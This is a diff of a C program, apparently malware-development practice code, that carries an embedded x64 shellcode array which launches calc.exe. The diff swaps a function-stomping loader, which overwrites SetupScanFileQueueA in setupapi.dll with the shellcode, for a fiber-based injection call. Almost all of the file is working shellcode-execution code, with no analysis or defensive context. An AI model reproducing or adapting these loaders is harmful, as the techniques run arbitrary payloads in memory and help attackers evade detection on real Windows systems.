@@ -1,12 +1,9 @@
-#include "stomp.h"
+#include "util.h"
 
+int main()
+{
 
-#define SACRIFICIAL_DLL "setupapi.dll"
-#define SACRIFICIAL_FUNC "SetupScanFileQueueA"
-
-// https://github.com/AbdouRoumi/Local-And-Remote_Function_Stomping
-
-UCHAR Shellcode[] = {
+	UCHAR Shellcode[] = {
 0xfc,0x48,0x83,0xe4,0xf0,
 0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
 0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
@@ -32,35 +29,11 @@ UCHAR Shellcode[] = {
 0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,
 0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,
 0x63,0x2e,0x65,0x78,0x65,0x00
-};
-
-int main()
-{
-
-	PVOID pAddress = NULL;
-	HMODULE hModule;
-
-	hModule = LoadLibraryA(SACRIFICIAL_DLL);
-	if (hModule == NULL) {
-		PRINT_ERROR("LoadLibraryA");
-		return 1;
-	}
-
-	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
-	if (pAddress == NULL) {
-		PRINT_ERROR("GetProcAddress");
-		return 1;
-	}
+	};
 
 	size_t sizeofshell = sizeof(Shellcode);
 
-	if (!Local_Stomp(Shellcode, sizeofshell, pAddress))
-	{
-		PRINT_ERROR("LocalStomp");
-		return 1;
-	}
-
-	INFO("Current Shellcode Address: [0x%p]", Shellcode);
+	FiberInject(Shellcode, sizeofshell);
 
 	CHAR("Quit...");
 	getchar();
